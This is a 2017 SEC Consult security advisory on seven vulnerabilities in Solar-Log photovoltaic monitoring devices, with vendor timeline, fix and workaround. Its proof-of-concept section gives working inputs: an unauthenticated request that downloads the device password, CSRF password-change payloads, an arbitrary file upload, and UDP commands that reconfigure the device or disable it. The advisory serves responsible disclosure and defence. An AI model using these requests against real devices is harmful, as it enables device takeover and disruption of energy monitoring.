@@ -1,0 +1,296 @@
+SEC Consult Vulnerability Lab Security Advisory < 20170322-0 >
+=======================================================================
+              title: Multiple vulnerabilities
+            product: Solare Datensysteme GmbH
+                     Solar-Log 250/300/500/800e/1000/1000 PM+/1200/2000
+ vulnerable version: Firmware 2.8.4-56 / 3.5.2-85
+      fixed version: Firmware 3.5.3-86
+         CVE number: -
+             impact: Critical
+           homepage: http://www.solar-log.com/de/home.html
+              found: 2017-01-23
+                 by: T. Weber (Office Vienna)
+                     SEC Consult Vulnerability Lab 
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+                     Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"Solare Datensysteme GmbH (SDS) is headquartered in the southern German city 
+of Binsdorf and specialises in the development and sale of monitoring systems 
+for photovoltaic plants. The company was founded in 2007 by Thomas Preuhs and 
+JÃ¶rg Karwath and was created from the company "TOP Solare Datensysteme". This 
+company had been developing and selling the "SolarLogâ„¢" product range since 
+2005. Our core competence covers innovative products with short development 
+cycles and an excellent cost/performance ratio. Our developments have the 
+outstanding characteristics of high customer value, simple operation and 
+universal application without requiring time-consuming installation of 
+software."
+
+Source: http://www.solar-log.uk/gb-en/unternehmen/ueber-uns.html
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends to immediately install the available firmware update
+and restrict network access.
+
+Furthermore, this device should not be used in production until a thorough 
+security review has been performed by security professionals and all 
+identified issues have been resolved.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Unauthenticated Download of Configuration including Device-Password
+This vulnerability is present at least on firmware 2.8.4-56.
+
+An attacker can download the configuration file without authentication and 
+extract the password to login to Solar-Log. Therefore, an attacker can gain
+administrative access to such a device without prior authentication.
+
+
+2) Cross-Site Request Forgery (CSRF)
+This vulnerability is present at least on firmware 3.5.2-85.
+
+A CSRF vulnerability enables an attacker to remove/modify a password of a
+device by luring an authenticated user to click on a crafted link. An attacker
+is able to take over the device by exploiting this vulnerability.
+
+
+3) Unauthenticated Arbitrary File Upload
+This vulnerability is present at least on firmware 3.5.2-85.
+
+Any files can be uploaded on the Solar-Log by using a crafted POST request. An
+attacker can start a malicious website or use the Solar-Log as share to store
+any (illegal) contents. 
+
+
+4) Information Disclosure (CVE-2001-1341)
+All Solar-Log devices in the current firmware versions are prone to this 
+information disclosure vulnerability. (2.8.4-56 / 3.5.2-85)
+
+The network configuration of the internal network including the gateway and
+the MAC address of the device are leaked.
+
+All details of the IPC@CHIP from Beck IPC (https://www.beck-ipc.com/) like RTOS
+version and serial number are leaked as well.
+
+
+5) Unauthenticated Change of Network-Configuration
+All Solar-Log devices in the current firmware versions are prone to this 
+vulnerability. (2.8.4-56 / 3.5.2-85)
+
+Since the Solar-Log is based on the chips of Beck IPC a UDP configuration 
+server is enabled by default. This server allows to change the IP configuration 
+over a specific UDP port. This functionality can be protected with a password, 
+but this is not set in the affected firmware versions.
+
+The MAC address, which is leaked by 4), is needed to configure the device.
+An attacker can reconfigure the device without any authentication.
+
+
+6) Unauthenticated Denial of Service
+All Solar-Log devices in the current firmware versions are prone to this 
+vulnerability. (2.8.4-56 / 3.5.2-85)
+
+The Beck IPC UDP configuration server on Solar-Log device can be attacked with 
+arbitrary UDP packets to permanently disable the Solar-Log until a manual 
+reboot is triggered.  
+
+
+7) Potential Unauthenticated Reprogram of IPC@CHIP Flash Memory
+Potentially available in all Solar-Log devices in the current firmware 
+versions. (2.8.4-56 / 3.5.2-85)
+
+Since the "CHIPTOOL" from BECK IPC enables a developer to reprogram the chip
+over the network via UDP, a missing password can also enable an attacker to do 
+this on a Solar-Log device. This action can lead to a simple Denial of Service
+or a complex botnet of Solar-Log devices!
+
+
+Proof of concept:
+-----------------
+1) Unauthenticated Download of Configuration including Device-Password
+The full configuration is exposed by sending the following GET-request:
+-------------------------------------------------------------------------------
+GET /data/misc.dat HTTP/1.1
+Host: <IP-Address>
+[...]
+-------------------------------------------------------------------------------
+Since the response contains the password, an attacker can easily take
+control over the device.
+
+
+2) Cross-Site Request Forgery
+By luring the user to issue the following request, the password is removed:
+-------------------------------------------------------------------------------
+POST /setjp HTTP/1.1
+Host: <IP-Address>
+
+preval=none;postval=105;{"221":"0","223":"0","225":"1","287":"","288":{"0":"0","1":"0"},"440":"0"}
+-------------------------------------------------------------------------------
+
+By luring the user to issue the following request, the password is modified:
+-------------------------------------------------------------------------------
+POST /setjp HTTP/1.1
+Host: <IP-Address>
+
+preval=none;postval=105;{"221":"0","223":"1","224":"<New-Password>","225":"1","287":"","288":{"0":"0","1":"0"},"440":"0"}
+-------------------------------------------------------------------------------
+
+
+3) Unauthenticated Arbitrary File Upload
+Any files can be uploaded by using the following POST-request:
+-------------------------------------------------------------------------------
+POST /menu/d_debug_db.html HTTP/1.1
+Host: <IP-Address>
+[...]
+Referer: http://<IP-Address>/menu/d_debug_db.html
+Content-Type: multipart/form-data; boundary=--------301473270
+Content-Length: 341
+
+----------301473270
+Content-Disposition: form-data; name="DESTINATION-PATH"
+
+PoC.html
+----------301473270
+Content-Disposition: form-data; name="FILE-CONTENT"; filename="file.txt"
+Content-Type: text/plain
+
+<html>
+ <head>
+ <title>SEC-Test</title>
+ </head>
+ <body>
+ <script>alert("XSS-PoC");</script>
+ </body>
+</html>
+----------301473270
+Content-Disposition: form-data; name="L_UPLOAD"
+
+Hochladen
+----------301473270--
+-------------------------------------------------------------------------------
+
+The uploaded content can be reached by this link:
+http://<IP-Address>/PoC.html
+
+
+4) Information Disclosure (CVE-2001-1341)
+This vulnerability is a known issue to IPC@CHIP since 2001.
+See: http://www.securityfocus.com/bid/2767/info
+
+The following URL can be used to open the "ChipCfg" file on a Solar-Log device:
+http://<IP-Address>/ChipCfg
+
+If an attacker is in the same subnet, he can directly request this information 
+from the device (the device responds to multicast) with the following command: 
+$ echo -n "0 1 A" >/dev/udp/<Target-IP>/8001
+
+
+5) Unauthenticated Change of Network-Configuration
+By using the following command a change of the network configuration can be
+triggerd unauthenticated on UDP port 8001:
+$ echo -n "<MAC> 4 2 0 <Desired-IP-Address> <Desired-Netmask> <Desired-Gateway>" >/dev/udp/<Target-IP>/8001
+
+Example: 
+$ echo -n "001122334455 4 2 0 192.168.4.5 255.255.255.0 192.168.4.254" >/dev/udp/192.168.4.9/8001
+
+
+6) Unauthenticated Denial of Service
+By using arbitrary null characters the IPC@CHIP can be pushed into an
+undesired state:
+$ echo -n "<MAC> 0 <IP-Address> <Netmask> <Gateway> DDDD\0\0" >/dev/udp/<Target-IP>/8001
+
+Example: 
+$ echo -n "001122334455 0 192.168.4.5 255.255.255.0 192.168.4.254 DDDD\0\0" >/dev/udp/192.168.4.5/8001
+
+
+7) Potential Unauthenticated Reprogram of IPC@CHIP Flash Memory
+This action was not tested against the device. Such attack can brick the 
+Solar-Log. The worst case scenario would be a botnet exploiting this vulnerability.
+
+A network-dump of the "CHIPTOOL" would be enough to reconstruct the required
+UDP packets for the attack.
+
+ 
+Vulnerable / tested versions:
+-----------------------------
+Solar-Log 1200 - 3.5.2-85
+Solar-Log 800e - 2.8.4-56
+
+Since the firmware for the other Solar-Log devices is exactly the same,  
+other devices with the same versions are also prone to the vulnerabilities!
+
+
+Vendor contact timeline:
+------------------------
+2017-02-02: Contacting vendor via info@solar-log.com, support@solar-log.com
+            and berlin@solar-log.com.
+2017-02-14: Vendor responds and requests the advisory unencrypted; Sent the
+            advisory unencrypted to the vendor.
+2017-02-20: Asked for an update.
+2017-02-21: Vendor states that the patch is in development. The update will
+            be published before 2017-03-24.
+2017-03-14: Asked for a status update. Vendor states that the update will
+            be available on 2017-03-21.
+2017-03-20: Vendor sends release notes. New firmware version is 3.5.3 build
+            86 for all affected Solar-Log devices. 
+            Informing the vendor that the release of the advisory is set to 
+            2017-03-22.
+2017-03-22: Public advisory release.
+
+
+Solution:
+---------
+Upgrade to firmware 3.5.3-86
+http://www.solar-log.com/de/service-support/downloads/firmware.html
+
+
+Workaround:
+-----------
+Restrict network access to the devices.
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/Career.htm
+
+Interested in improving your cyber security with the experts of SEC Consult? 
+Contact our local offices https://www.sec-consult.com/en/About/Contact.htm
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF T. Weber / @2017
